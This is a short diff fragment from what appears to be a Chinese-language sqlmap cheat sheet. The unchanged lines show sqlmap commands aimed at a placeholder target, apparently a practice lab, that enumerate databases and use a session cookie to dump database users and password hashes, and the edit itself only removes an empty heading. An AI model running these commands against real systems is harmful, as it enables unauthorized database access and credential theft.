@@ -43,5 +43,5 @@ sqlmap.py -u "http://IP:PORT/?id=1"  --dbs  -o "sqlmap.log" --resume  #恢复已
 sqlmap.py -u "http://IP:PORT/?id=1&Submit=Submit" --cookie="PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406" --string="Surname" --dbms=mysql --users --password
 ```
 
-## 2. 
+
 
